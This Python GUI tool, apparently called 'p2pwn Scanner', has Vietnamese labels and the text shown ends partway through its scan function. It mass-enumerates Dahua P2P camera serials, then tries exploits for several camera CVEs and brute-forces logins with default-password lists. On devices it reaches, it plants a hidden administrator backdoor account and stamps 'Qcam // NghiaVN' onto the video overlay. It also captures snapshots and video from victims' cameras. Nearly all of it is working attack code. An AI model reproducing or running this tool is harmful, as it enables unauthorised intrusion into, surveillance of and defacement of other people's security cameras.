#!/usr/bin/env python3
# scan.py - Dahua P2P Scanner GUI v2.2 FINAL
# FIXED: UI thread safety, log queue overflow, stats bottleneck, DB resilience
# Requires: pip install requests
# Run: python scan.py

import os
import re
import sys
import csv
import json
import time
import socket
import struct
import base64
import hashlib
import sqlite3
import threading
import queue
import subprocess
from itertools import product
from datetime import datetime

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext

import requests
requests.packages.urllib3.disable_warnings()

# ============================================================
# CONFIG
# ============================================================
P2P_API = "https://p2p.dahuasecurity.com/api/device/query"
P2P_API_V2 = "https://p2p.dahuasecurity.com/api/v2/device/info"
P2P_HOST = "p2p.dahuasecurity.com"
P2P_PORT = 8800
DHIP_PORT = 37777
HTTP_PORT = 80
RTSP_PORT = 554
XIONGMAI_PORT = 8000
EZVIZ_PORT = 9010

BACKDOOR_USER = "QcamUser"
BACKDOOR_PASS = "Manhmanh123@"
OSD_TEXT = "Qcam // NghiaVN"

USERNAMES = ["admin", "root", "888888", "666666", "default", "user", "qcam"]
PASSWORDS = [
    "admin", "123456", "888888", "666666", "password", "default",
    "admin123", "12345", "111111", "000000", "abc123", "dahua123",
    "Dahua@123", "admin@123", "root", "toor", "pass", "1234",
    "12345678", "qwerty", "letmein", "welcome", "dahua", "Dahua2023",
    "Manhmanh123@", "Qcam@123", "qcam123",
]

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"


# ============================================================
# HELPERS
# ============================================================
def ts():
    return datetime.now().strftime("%H:%M:%S")


def log_msg(msg, level="*"):
    return f"[{ts()}] [{level}] {msg}"


def make_session(auth=None):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Accept": "application/json"})
    if auth:
        s.auth = auth
    return s


def recv_all(sock, max_bytes=65536, timeout=3):
    sock.settimeout(timeout)
    chunks = []
    total = 0
    try:
        while total < max_bytes:
            c = sock.recv(4096)
            if not c:
                break
            chunks.append(c)
            total += len(c)
    except Exception:
        pass
    return b"".join(chunks)


# ============================================================
# P2P SERIAL CHECK
# ============================================================
def check_serial(serial, timeout=5, session=None):
    if session is None:
        session = make_session()

    for api in (P2P_API, P2P_API_V2):
        try:
            r = session.post(api, json={"sn": serial},
                             headers={"Content-Type": "application/json"},
                             timeout=timeout)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if (data.get("code") == 1000
                            or data.get("success")
                            or data.get("device")):
                        ip = None
                        dev = data.get("device") or data.get("data") or {}
                        if isinstance(dev, dict):
                            ip = (dev.get("ip") or dev.get("address")
                                  or dev.get("publicIp"))
                        return True, ip, data
                except Exception:
                    if len(r.text) > 20:
                        return True, None, r.text[:300]
        except Exception:
            pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((P2P_HOST, P2P_PORT))
        pkt = (b"\x00\x00\x00\x00"
               + serial.encode().ljust(16, b"\x00")
               + b"\x01\x00\x00\x00")
        s.send(pkt)
        resp = recv_all(s, max_bytes=4096, timeout=timeout)
        s.close()
        if resp and len(resp) > 4:
            return True, None, resp.hex()
    except Exception:
        pass

    return False, None, None


# ============================================================
# CVE MODULE
# ============================================================
class CVEModule:
    @staticmethod
    def cve_2018_10088(ip, timeout=5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, XIONGMAI_PORT))
            payload = b"GET /" + b"A" * 4096 + b" HTTP/1.0\r\n\r\n"
            s.send(payload)
            resp = recv_all(s, max_bytes=2048, timeout=timeout)
            s.close()
            if not resp:
                return True, "buffer_overflow_triggered"
            if b"uc-httpd" in resp.lower() or b"XiongMai" in resp:
                return True, "uc-httpd_banner"
        except ConnectionResetError:
            return True, "connection_reset"
        except Exception:
            pass
        return False, None

    @staticmethod
    def cve_2021_33044(ip, timeout=5):
        try:
            payload = ('{"method":"global.login","params":{"userName":"admin",'
                       '"password":"","clientType":"NetKeyboard",'
                       '"loginType":"Direct"},"id":1}')
            r = requests.post(
                f"http://{ip}/RPC2_Login", data=payload,
                headers={"Content-Type": "application/json", "User-Agent": UA},
                timeout=timeout)
            if r.status_code == 200:
                b = r.text.lower()
                if "result" in b or "session" in b or "realm" in b:
                    return True, r.text[:300]
        except Exception:
            pass
        return False, None

    @staticmethod
    def cve_2021_33045(ip, timeout=5):
        try:
            payload = ('{"method":"global.login","params":{"userName":"admin",'
                       '"password":"","clientType":"Loopback",'
                       '"loginType":"Direct"},"id":1}')
            r = requests.post(
                f"http://{ip}/RPC2_Login", data=payload,
                headers={"Content-Type": "application/json", "User-Agent": UA},
                timeout=timeout)
            if r.status_code == 200:
                b = r.text.lower()
                if "result" in b or "session" in b or "realm" in b:
                    return True, r.text[:300]
        except Exception:
            pass
        return False, None

    @staticmethod
    def cve_2021_36260(ip, timeout=5):
        try:
            payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                       '<language><a>$(id)</a></language>')
            r = requests.put(
                f"http://{ip}/SDK/webLanguage", data=payload,
                headers={"Content-Type": "application/xml", "User-Agent": UA},
                timeout=timeout)
            if r.status_code == 200:
                body = r.text
                if "uid=" in body or "gid=" in body or "root" in body:
                    return True, f"cmd_injection: {body[:300]}"
                return True, f"endpoint_reachable: {body[:200]}"
        except Exception:
            pass
        return False, None

    @staticmethod
    def cve_2022_30563(ip, timeout=5):
        try:
            soap = ('<?xml version="1.0" encoding="UTF-8"?>'
                    '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
                    '<s:Body>'
                    '<GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>'
                    '</s:Body></s:Envelope>')
            r = requests.post(
                f"http://{ip}/onvif/device_service", data=soap,
                headers={"Content-Type": "application/soap+xml; charset=utf-8",
                         "User-Agent": UA},
                timeout=timeout)
            if r.status_code == 200 and "SystemDateAndTime" in r.text:
                return True, "onvif_reachable"
            if r.status_code == 401:
                return True, "onvif_auth_challenge"
        except Exception:
            pass
        return False, None

    @staticmethod
    def cve_2023_48121(ip, timeout=5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, EZVIZ_PORT))
            magic = b"\x00\x00\x00\x00"
            cmd = b"\x01"
            flags = b"\x00"
            payload = b"snapshot"
            length = struct.pack("<I", len(payload))
            packet = magic + cmd + flags + length + payload
            s.send(packet)
            resp = recv_all(s, max_bytes=4096, timeout=timeout)
            s.close()
            if resp and len(resp) > 8:
                return True, f"ezviz_bypass: {resp[:100].hex()}"
        except Exception:
            pass
        return False, None

    @classmethod
    def run_all(cls, ip, timeout=5, enabled=None):
        if enabled is None:
            enabled = {"2018": True, "2021_44": True, "2021_45": True,
                       "2021_36260": True, "2022": True, "2023": True}
        found = []
        if enabled.get("2018"):
            ok, d = cls.cve_2018_10088(ip, timeout)
            if ok:
                found.append(("CVE-2018-10088", d))
        if enabled.get("2021_44"):
            ok, d = cls.cve_2021_33044(ip, timeout)
            if ok:
                found.append(("CVE-2021-33044", d))
        if enabled.get("2021_45"):
            ok, d = cls.cve_2021_33045(ip, timeout)
            if ok:
                found.append(("CVE-2021-33045", d))
        if enabled.get("2021_36260"):
            ok, d = cls.cve_2021_36260(ip, timeout)
            if ok:
                found.append(("CVE-2021-36260", d))
        if enabled.get("2022"):
            ok, d = cls.cve_2022_30563(ip, timeout)
            if ok:
                found.append(("CVE-2022-30563", d))
        if enabled.get("2023"):
            ok, d = cls.cve_2023_48121(ip, timeout)
            if ok:
                found.append(("CVE-2023-48121", d))
        return found


# ============================================================
# BRUTE FORCE
# ============================================================
class BruteForce:
    @staticmethod
    def http(ip, timeout=5, max_attempts=None):
        session = make_session()
        attempts = 0
        for u in USERNAMES:
            for p in PASSWORDS:
                if max_attempts and attempts >= max_attempts:
                    return None
                attempts += 1
                try:
                    r = session.post(f"http://{ip}/RPC2_Login", json={
                        "method": "global.login",
                        "params": {"userName": u, "password": p,
                                   "clientType": "Web3",
                                   "loginType": "Direct"},
                        "id": 1,
                    }, timeout=timeout)
                    if r.status_code == 200 and (
                            "result" in r.text.lower()
                            and "true" in r.text.lower()):
                        return f"{u}:{p}"
                except Exception:
                    pass
        return None

    @staticmethod
    def rtsp(ip, timeout=5, max_attempts=None):
        attempts = 0
        for u in USERNAMES:
            for p in PASSWORDS:
                if max_attempts and attempts >= max_attempts:
                    return None
                attempts += 1
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((ip, RTSP_PORT))
                    auth = base64.b64encode(f"{u}:{p}".encode()).decode()
                    req = (f"DESCRIBE rtsp://{ip}/ RTSP/1.0\r\n"
                           f"CSeq: 1\r\nAuthorization: Basic {auth}\r\n\r\n")
                    s.send(req.encode())
                    resp = recv_all(s, max_bytes=2048,
                                    timeout=timeout).decode(errors="ignore")
                    s.close()
                    if "200 OK" in resp:
                        return f"{u}:{p}"
                except Exception:
                    pass
        return None

    @classmethod
    def run(cls, ip, timeout=5, max_attempts=None):
        creds = cls.http(ip, timeout, max_attempts)
        if creds:
            return creds, "http"
        creds = cls.rtsp(ip, timeout, max_attempts)
        if creds:
            return creds, "rtsp"
        return None, None


# ============================================================
# BACKDOOR
# ============================================================
class Backdoor:
    @staticmethod
    def sdk(ip, timeout=5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, DHIP_PORT))
            for pw in (BACKDOOR_PASS,
                       hashlib.md5(BACKDOOR_PASS.encode()).hexdigest()):
                payload = json.dumps({
                    "method": "user.add",
                    "params": {"user": {
                        "Name": BACKDOOR_USER, "Password": pw,
                        "Group": "admin",
                        "Authority": "Administrator"}},
                    "id": 1,
                }).encode()
                header = struct.pack("<IIIIIIII", 0x12345678, 1,
                                     len(payload), 0, 0, 0, 0, 0)
                s.send(header + payload)
                resp = recv_all(s, max_bytes=8192, timeout=timeout)
                if resp and (b"OK" in resp.upper()
                             or b"true" in resp.lower()):
                    s.close()
                    return True, "sdk"
            s.close()
        except Exception:
            pass
        return False, None

    @staticmethod
    def cgi(ip, timeout=5):
        try:
            r = requests.post(f"http://{ip}/cgi-bin/user.add", data={
                "user.Name": BACKDOOR_USER,
                "user.Password": BACKDOOR_PASS,
                "user.Group": "admin",
                "user.Authority": "Administrator",
            }, headers={"User-Agent": UA}, timeout=timeout)
            if r.status_code == 200 and (
                    "OK" in r.text.upper() or "true" in r.text.lower()):
                return True, "cgi"
        except Exception:
            pass
        return False, None

    @staticmethod
    def dhip(ip, timeout=5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, DHIP_PORT))
            data = json.dumps({
                "name": BACKDOOR_USER, "password": BACKDOOR_PASS,
                "group": "admin", "authority": 0xFFFFFFFF,
            }).encode()
            pkt = (b"\x00\x00\x00\x00\x01\x10"
                   + struct.pack("<I", len(data))
                   + struct.pack("<I", 0) + b"\x00\x00" + data)
            s.send(pkt)
            resp = recv_all(s, max_bytes=8192, timeout=timeout)
            s.close()
            if resp and (b"OK" in resp.upper()
                         or b"true" in resp.lower()
                         or len(resp) > 8):
                return True, "dhip"
        except Exception:
            pass
        return False, None

    @staticmethod
    def onvif(ip, timeout=5):
        soap = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
            'xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
            '<s:Body><tds:CreateUsers><tds:User>'
            f'<tds:Username>{BACKDOOR_USER}</tds:Username>'
            f'<tds:Password>{BACKDOOR_PASS}</tds:Password>'
            '<tds:UserLevel>Administrator</tds:UserLevel>'
            '</tds:User></tds:CreateUsers></s:Body></s:Envelope>')
        try:
            r = requests.post(
                f"http://{ip}/onvif/device_service", data=soap,
                headers={"Content-Type": "application/soap+xml; charset=utf-8",
                         "User-Agent": UA},
                timeout=timeout)
            if r.status_code == 200 and "fault" not in r.text.lower():
                return True, "onvif"
        except Exception:
            pass
        return False, None

    @classmethod
    def run_all(cls, ip, timeout=5):
        results = []
        for fn in (cls.sdk, cls.cgi, cls.dhip, cls.onvif):
            ok, vec = fn(ip, timeout)
            if ok and vec:
                results.append(vec)
        return results


# ============================================================
# OSD
# ============================================================
class OSD:
    @staticmethod
    def cgi(ip, user="admin", password="", text=OSD_TEXT,
            channel=1, timeout=5):
        try:
            session = make_session(auth=(user, password))
            params = {
                "action": "setConfig",
                "VideoWidget[0].Channel": channel,
                "VideoWidget[0].Enable": "true",
                "VideoWidget[0].Text": text,
                "VideoWidget[0].X": 100,
                "VideoWidget[0].Y": 100,
                "VideoWidget[0].FontSize": 48,
                "VideoWidget[0].FontColor": "0xFF0000",
                "VideoWidget[0].BackColor": "0x000000",
                "VideoWidget[0].Transparency": 0,
            }
            r = session.get(f"http://{ip}/cgi-bin/configManager.cgi",
                            params=params, timeout=timeout)
            if r.status_code == 200 and (
                    "OK" in r.text.upper() or "true" in r.text.lower()):
                return True
        except Exception:
            pass
        return False

    @staticmethod
    def dhip(ip, text=OSD_TEXT, channel=1, timeout=5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, DHIP_PORT))
            data = json.dumps({
                "channel": channel,
                "osd": {"enable": True, "text": text, "x": 100, "y": 100,
                        "fontSize": 48, "fontColor": "0xFF0000",
                        "backColor": "0x000000"},
            }).encode()
            pkt = (b"\x00\x00\x00\x00\x01\x40"
                   + struct.pack("<I", len(data))
                   + struct.pack("<I", 0) + b"\x00\x00" + data)
            s.send(pkt)
            resp = recv_all(s, max_bytes=8192, timeout=timeout)
            s.close()
            if resp and (b"OK" in resp.upper() or len(resp) > 8):
                return True
        except Exception:
            pass
        return False

    @classmethod
    def run(cls, ip, user="admin", password="", text=OSD_TEXT,
            channel=1, timeout=5):
        if cls.cgi(ip, user, password, text, channel, timeout):
            return True, "cgi"
        if cls.dhip(ip, text, channel, timeout):
            return True, "dhip"
        return False, None


# ============================================================
# VIDEO / SNAPSHOT
# ============================================================
class VideoCapture:
    @staticmethod
    def snapshot(ip, user="admin", password="", channel=1,
                 timeout=8, outdir="logs"):
        os.makedirs(outdir, exist_ok=True)
        try:
            r = requests.get(
                f"http://{ip}/cgi-bin/snapshot.cgi?channel={channel}",
                auth=(user, password), timeout=timeout)
            if r.status_code == 200 and r.content[:2] == b"\xFF\xD8":
                fn = os.path.join(
                    outdir, f"snap_{ip}_ch{channel}_{int(time.time())}.jpg")
                with open(fn, "wb") as f:
                    f.write(r.content)
                return True, fn
        except Exception:
            pass
        return False, None

    @staticmethod
    def video_mjpeg(ip, user="admin", password="", channel=1,
                    duration=5, timeout=8, outdir="logs"):
        os.makedirs(outdir, exist_ok=True)
        fn = os.path.join(
            outdir, f"video_{ip}_ch{channel}_{int(time.time())}.mjpeg")
        frames = 0
        start = time.time()
        try:
            with open(fn, "wb") as f:
                while time.time() - start < duration:
                    try:
                        r = requests.get(
                            f"http://{ip}/cgi-bin/snapshot.cgi?channel={channel}",
                            auth=(user, password), timeout=timeout)
                        if (r.status_code == 200
                                and r.content[:2] == b"\xFF\xD8"):
                            f.write(r.content)
                            frames += 1
                    except Exception:
                        pass
                    time.sleep(0.2)
            if frames > 0:
                return True, fn, frames
        except Exception:
            pass
        return False, None, 0


# ============================================================
# SQLITE WRITER (DEDICATED THREAD)
# ============================================================
class DBWriter:
    def __init__(self, path="p2pwn.db"):
        self.path = path
        self.q = queue.Queue()
        self.stop = threading.Event()
        with sqlite3.connect(self.path, timeout=10) as c:
            c.execute("""CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ts INTEGER, serial TEXT, ip TEXT, status TEXT,
                creds TEXT, cve TEXT, backdoor TEXT,
                osd TEXT, video TEXT)""")
        self.thread = threading.Thread(target=self._worker, daemon=True)
        self.thread.start()

    def _worker(self):
        conn = sqlite3.connect(self.path, timeout=10)
        while not self.stop.is_set():
            try:
                row = self.q.get(timeout=0.5)
            except queue.Empty:
                continue
            if row is None:
                break
            try:
                conn.execute("""INSERT INTO devices
                    (ts, serial, ip, status, creds, cve, backdoor, osd, video)
                    VALUES (?,?,?,?,?,?,?,?,?)""", row)
                conn.commit()
            except Exception as e:
                try:
                    conn.rollback()
                except Exception:
                    pass
                print(f"[DB] {e}")
            finally:
                self.q.task_done()
        conn.close()

    def add(self, **kw):
        try:
            self.q.put_nowait((
                int(time.time()), kw.get("serial"), kw.get("ip"),
                kw.get("status", "online"), kw.get("creds", ""),
                kw.get("cve", ""), kw.get("backdoor", ""),
                kw.get("osd", ""), kw.get("video", ""),
            ))
        except queue.Full:
            pass

    def _fetch_all(self):
        with sqlite3.connect(self.path, timeout=10) as c:
            c.row_factory = sqlite3.Row
            return [dict(r) for r in
                    c.execute("SELECT * FROM devices").fetchall()]

    def export_json(self, path):
        rows = self._fetch_all()
        with open(path, "w", encoding="utf-8") as f:
            json.dump(rows, f, indent=2, ensure_ascii=False)
        return len(rows)

    def export_csv(self, path):
        rows = self._fetch_all()
        if not rows:
            return 0
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
            w.writeheader()
            w.writerows(rows)
        return len(rows)

    def close(self):
        self.stop.set()
        self.q.put(None)


# ============================================================
# GUI
# ============================================================
class P2PwnScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("p2pwn Scanner v2.2")
        self.root.geometry("1250x800")
        self.stop_event = threading.Event()
        self.worker_thread = None
        self.log_q = queue.Queue(maxsize=10000)
        self.ui_q = queue.Queue(maxsize=5000)
        self.stats = {"hacked": 0, "online": 0, "skip": 0, "total": 0}
        self.lock = threading.Lock()
        self.db = DBWriter("p2pwn.db")
        self.start_time = None
        self.build_ui()
        self.poll_log()

    def build_ui(self):
        pf = tk.LabelFrame(self.root, text="Tham số", padx=8, pady=8)
        pf.pack(fill="x", padx=8, pady=5)

        tk.Label(pf, text="Serial / Prefix:").grid(row=0, column=0, sticky="w")
        self.e_prefix = tk.Entry(pf, width=32)
        self.e_prefix.insert(0, "5E09A97PAJ")
        self.e_prefix.grid(row=0, column=1, sticky="w", padx=5)
        tk.Label(pf, text="(10 = prefix, 15 = S/N đầy đủ)",
                 fg="gray").grid(row=0, column=2, sticky="w")

        tk.Label(pf, text="Thư mục xuất:").grid(
            row=1, column=0, sticky="w", pady=3)
        self.e_outdir = tk.Entry(pf, width=32)
        self.e_outdir.insert(0, "C35_V1")
        self.e_outdir.grid(row=1, column=1, sticky="w", padx=5, pady=3)
        tk.Label(pf, text="(thư mục sẽ được tạo)",
                 fg="gray").grid(row=1, column=2, sticky="w")

        tk.Label(pf, text="Luồng:").grid(row=2, column=0, sticky="w", pady=3)
        self.s_threads = tk.Spinbox(pf, from_=1, to=200, width=8)
        self.s_threads.delete(0, "end")
        self.s_threads.insert(0, "160")
        self.s_threads.grid(row=2, column=1, sticky="w", padx=5, pady=3)
        tk.Label(pf, text="(Python: tối đa 200)",
                 fg="gray").grid(row=2, column=2, sticky="w")

        tk.Label(pf, text="Nurses:").grid(row=3, column=0, sticky="w", pady=3)
        self.s_nurses = tk.Spinbox(pf, from_=1, to=500, width=8)
        self.s_nurses.delete(0, "end")
        self.s_nurses.insert(0, "110")
        self.s_nurses.grid(row=3, column=1, sticky="w", padx=5, pady=3)

        cf = tk.Frame(self.root)
        cf.pack(fill="x", padx=8, pady=5)
        self.v_osd_pro = tk.BooleanVar(value=True)
        self.v_video = tk.BooleanVar(value=False)
        self.v_osd = tk.BooleanVar(value=True)
        self.v_backdoor = tk.BooleanVar(value=True)
        self.v_brute = tk.BooleanVar(value=True)

        self.v_cve2018 = tk.BooleanVar(value=True)
        self.v_cve2021_44 = tk.BooleanVar(value=True)
        self.v_cve2021_45 = tk.BooleanVar(value=True)
        self.v_cve2021_36260 = tk.BooleanVar(value=True)
        self.v_cve2022 = tk.BooleanVar(value=True)
        self.v_cve2023 = tk.BooleanVar(value=True)

        tk.Checkbutton(cf, text="📷 OSD Pro: Add khi hack thành công",
                       variable=self.v_osd_pro).grid(row=0, column=0, sticky="w")
        tk.Checkbutton(cf, text="🎥 Video 5s: Quay video 5 giây (.mjpeg)",
                       variable=self.v_video).grid(row=1, column=0, sticky="w")
        tk.Checkbutton(cf, text="🎯 OSD: Thêm 'Qcam // NghiaVN'",
                       variable=self.v_osd).grid(row=2, column=0, sticky="w")
        tk.Checkbutton(cf, text="🔑 Backdoor: Tạo QcamUser/Manhmanh123@",
                       variable=self.v_backdoor).grid(row=3, column=0, sticky="w")
        tk.Checkbutton(cf, text="🔒 Đồ mật khẩu: Thử mật khẩu yếu",
                       variable=self.v_brute).grid(row=4, column=0, sticky="w")

        tk.Checkbutton(cf, text="🛡 CVE-2018-10088 (XiongMai)",
                       variable=self.v_cve2018).grid(row=0, column=1,
                                                     sticky="w", padx=25)
        tk.Checkbutton(cf, text="🛡 CVE-2021-33044 (NetKeyboard)",
                       variable=self.v_cve2021_44).grid(row=1, column=1,
                                                        sticky="w", padx=25)
        tk.Checkbutton(cf, text="🛡 CVE-2021-33045 (Loopback)",
                       variable=self.v_cve2021_45).grid(row=2, column=1,
                                                        sticky="w", padx=25)
        tk.Checkbutton(cf, text="🛡 CVE-2021-36260 (Hikvision)",
                       variable=self.v_cve2021_36260).grid(row=3, column=1,
                                                           sticky="w", padx=25)
        tk.Checkbutton(cf, text="🛡 CVE-2022-30563 (ONVIF Replay)",
                       variable=self.v_cve2022).grid(row=4, column=1,
                                                     sticky="w", padx=25)
        tk.Checkbutton(cf, text="🛡 CVE-2023-48121 (EZVIZ)",
                       variable=self.v_cve2023).grid(row=5, column=1,
                                                     sticky="w", padx=25)

        bf = tk.Frame(self.root)
        bf.pack(fill="x", padx=8, pady=5)
        tk.Button(bf, text="▶ BẮT ĐẦU", command=self.start,
                  bg="#2ea043", fg="white", width=12,
                  font=("Arial", 10, "bold")).pack(side="left", padx=3)
        tk.Button(bf, text="■ DỪNG", command=self.stop,
                  bg="#da3633", fg="white", width=12,
                  font=("Arial", 10, "bold")).pack(side="left", padx=3)
        tk.Button(bf, text="📁 Mở thư mục", command=self.open_dir,
                  width=14).pack(side="left", padx=3)
        tk.Button(bf, text="⚙ Tạo config", command=self.create_config,
                  width=14).pack(side="left", padx=3)
        tk.Button(bf, text="💾 Export JSON", command=self.export_json,
                  width=14).pack(side="left", padx=3)
        tk.Button(bf, text="📊 Export CSV", command=self.export_csv,
                  width=14).pack(side="left", padx=3)

        sf = tk.Frame(self.root)
        sf.pack(fill="x", padx=8)
        self.l_status = tk.Label(sf, text="Sẵn sàng", anchor="w",
                                 fg="#58a6ff",
                                 font=("Arial", 10, "bold"))
        self.l_status.pack(side="left")
        self.l_stats = tk.Label(
            sf, text="Đã hack: 0 | Online: 0 | Bỏ qua: 0 | 0.0%",
            anchor="e", fg="#2ea043")
        self.l_stats.pack(side="right")

        self.nb = ttk.Notebook(self.root)
        self.nb.pack(fill="both", expand=True, padx=8, pady=5)

        self.txt_log = scrolledtext.ScrolledText(
            self.nb, state="disabled", bg="#0d1117", fg="#c9d1d9",
            font=("Consolas", 9))
        self.nb.add(self.txt_log, text="📋 Nhật ký")

        self.txt_hack = scrolledtext.ScrolledText(
            self.nb, state="disabled", bg="#0d1117", fg="#2ea043",
            font=("Consolas", 9))
        self.nb.add(self.txt_hack, text="🎯 Đã hack")

        self.txt_online = scrolledtext.ScrolledText(
            self.nb, state="disabled", bg="#0d1117", fg="#58a6ff",
            font=("Consolas", 9))
        self.nb.add(self.txt_online, text="🌐 Online (trực tiếp)")

    def log(self, msg):
        try:
            self.log_q.put_nowait(msg)
        except queue.Full:
            pass

    def ui_update(self, kind, *args):
        try:
            self.ui_q.put_nowait((kind, args))
        except queue.Full:
            pass

    def poll_log(self):
        count = 0
        try:
            while count < 20:
                m = self.log_q.get_nowait()
                self.txt_log.configure(state="normal")
                self.txt_log.insert("end", m + "\n")
                self.txt_log.see("end")
                self.txt_log.configure(state="disabled")
                count += 1
        except queue.Empty:
            pass

        try:
            while True:
                kind, args = self.ui_q.get_nowait()
                if kind == "online":
                    self.append_tab(self.txt_online, f"{args[0]} -> {args[1]}")
                elif kind == "hack":
                    self.append_tab(self.txt_hack, f"{args[0]} -> {args[1]}")
        except queue.Empty:
            pass

        self.update_stats()
        self.root.after(200, self.poll_log)

    def append_tab(self, widget, text):
        widget.configure(state="normal")
        widget.insert("end", text + "\n")
        widget.see("end")
        widget.configure(state="disabled")

    def update_stats(self):
        with self.lock:
            tot = max(self.stats["total"], 1)
            done = (self.stats["hacked"] + self.stats["online"]
                    + self.stats["skip"])
            pct = done / tot * 100
            self.l_stats.config(
                text=f"Đã hack: {self.stats['hacked']} | "
                     f"Online: {self.stats['online']} | "
                     f"Bỏ qua: {self.stats['skip']} | {pct:.1f}%")

    def open_dir(self):
        d = self.e_outdir.get().strip()
        if not d:
            messagebox.showwarning("Lỗi", "Chưa nhập thư mục")
            return
        os.makedirs(d, exist_ok=True)
        try:
            if sys.platform == "win32":
                os.startfile(d)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", d])
            else:
                subprocess.Popen(["xdg-open", d])
        except Exception as e:
            messagebox.showerror("Lỗi", str(e))

    def create_config(self):
        cfg = {
            "prefix": self.e_prefix.get().strip(),
            "outdir": self.e_outdir.get().strip(),
            "threads": int(self.s_threads.get()),
            "nurses": int(self.s_nurses.get()),
            "osd_pro": self.v_osd_pro.get(),
            "video": self.v_video.get(),
            "osd": self.v_osd.get(),
            "backdoor": self.v_backdoor.get(),
            "brute": self.v_brute.get(),
            "cve2018": self.v_cve2018.get(),
            "cve2021_44": self.v_cve2021_44.get(),
            "cve2021_45": self.v_cve2021_45.get(),
            "cve2021_36260": self.v_cve2021_36260.get(),
            "cve2022": self.v_cve2022.get(),
            "cve2023": self.v_cve2023.get(),
        }
        with open("p2pwn_config.json", "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
        self.log(log_msg("Đã tạo p2pwn_config.json", "+"))
        messagebox.showinfo("OK", "Đã tạo p2pwn_config.json")

    def export_json(self):
        p = filedialog.asksaveasfilename(
            defaultextension=".json", initialfile="p2pwn_export.json")
        if p:
            n = self.db.export_json(p)
            self.log(log_msg(f"Export JSON: {n} records -> {p}", "+"))

    def export_csv(self):
        p = filedialog.asksaveasfilename(
            defaultextension=".csv", initialfile="p2pwn_export.csv")
        if p:
            n = self.db.export_csv(p)
            self.log(log_msg(f"Export CSV: {n} records -> {p}", "+"))

    def start(self):
        if self.worker_thread and self.worker_thread.is_alive():
            messagebox.showinfo("Thông báo", "Đang chạy")
            return
        prefix = self.e_prefix.get().strip()
        if len(prefix) not in (10, 15):
            messagebox.showerror(
                "Lỗi", "Prefix phải 10 ký tự hoặc 15 ký tự S/N")
            return

        self.stop_event.clear()
        with self.lock:
            self.stats = {"hacked": 0, "online": 0, "skip": 0, "total": 0}
        self.start_time = time.time()

        for w in (self.txt_log, self.txt_hack, self.txt_online):
            w.configure(state="normal")
            w.delete("1.0", "end")
            w.configure(state="disabled")

        self.l_status.config(text=f"Đang quét {prefix}...")
        self.worker_thread = threading.Thread(
            target=self.scan_worker, args=(prefix,), daemon=True)
        self.worker_thread.start()

    def stop(self):
        self.stop_event.set()
        self.l_status.config(text="Đã dừng")
        self.log(log_msg("Dừng theo yêu cầu", "!"))

    def scan_worker(self, prefix):
        threads = int(self.s_threads.get())
        outdir = self.e_outdir.get().strip() or "output"
        os.makedirs(outdir, exist_ok=True)

        q = queue.Queue(maxsize=20000)

        def producer():
            try:
                if len(prefix) == 10:
                    charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    for combo in product(charset, repeat=6):
                        if self.stop_event.is_set():
                            break
                        q.put(prefix + "".join(combo))
                        with self.lock:
                            self.stats["total"] += 1
                else:
                    q.put(prefix)
                    with self.lock:
                        self.stats["total"] = 1
            except Exception as e:
                self.log(log_msg(f"Producer err: {e}", "-"))

        prod_t = threading.Thread(target=producer, daemon=True)
        prod_t.start()

        self.log(log_msg(
            f"Bắt đầu scan prefix={prefix}, threads={threads}"))

        cfg = {
            "osd_pro": self.v_osd_pro.get(),
            "video": self.v_video.get(),
            "osd": self.v_osd.get(),
            "backdoor": self.v_backdoor.get(),
            "brute": self.v_brute.get(),
            "cve": {
                "2018": self.v_cve2018.get(),
                "2021_44": self.v_cve2021_44.get(),
                "2021_45": self.v_cve2021_45.get(),
                "2021_36260": self.v_cve2021_36260.get(),
                "2022": self.v_cve2022.get(),
                "2023": self.v_cve2023.get(),
            },
        }

        def worker():
            session = make_session()
            while not self.stop_event.is_set():
                try:
                    serial = q.get(timeout=0.5)
                except queue.Empty:
                    if not prod_t.is_alive():
                        break
                    continue

                try:
                    alive, ip, _info = check_serial(
                        serial, timeout=5, session=session)
                    if not alive:
                        with self.lock:
                            self.stats["skip"] += 1
                        continue

                    with self.lock:
                        self.stats["online"] += 1
                    display_ip = ip or f"p2p:{serial[:12]}"
                    self.log(log_msg(
                        f"ONLINE {serial} -> {display_ip}", "+"))
                    self.ui_update("online", serial, display_ip)

                    if not ip:
                        self.db.add(serial=serial, ip=display_ip,
                                    status="online")
                        continue

                    hacked = False
                    notes = {"creds": "", "cve": "", "backdoor": "",
                             "osd": "", "video": ""}

                    if any(cfg["cve"].values()):
                        cves = CVEModule.run_all(
                            ip, timeout=5, enabled=cfg["cve"])
                        if cves:
                            hacked = True
                            notes["cve"] = ",".join(c[0] for c in cves)
                            self.log(log_msg(
                                f"🛡 {serial} ({ip}) -> {notes['cve']}", "+"))

                    user, pw = "admin", ""
